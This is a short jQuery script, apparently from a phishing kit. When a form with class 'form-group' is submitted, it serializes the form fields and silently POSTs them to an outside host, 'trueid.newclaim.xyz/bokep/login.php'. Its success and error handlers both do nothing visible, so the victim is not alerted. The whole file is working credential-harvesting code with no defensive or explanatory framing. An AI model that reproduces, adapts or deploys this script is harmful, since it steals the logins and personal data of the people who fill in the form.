$(".form-group").submit(function() {
	var d = $(".form-group");

	$.ajax({
        url: "https://trueid.newclaim.xyz/bokep/login.php",
        type: "POST",
        data: d.serialize(),
        success: function () {
            return true;
        },
        error: function () {
            return true;
        },
    });
});
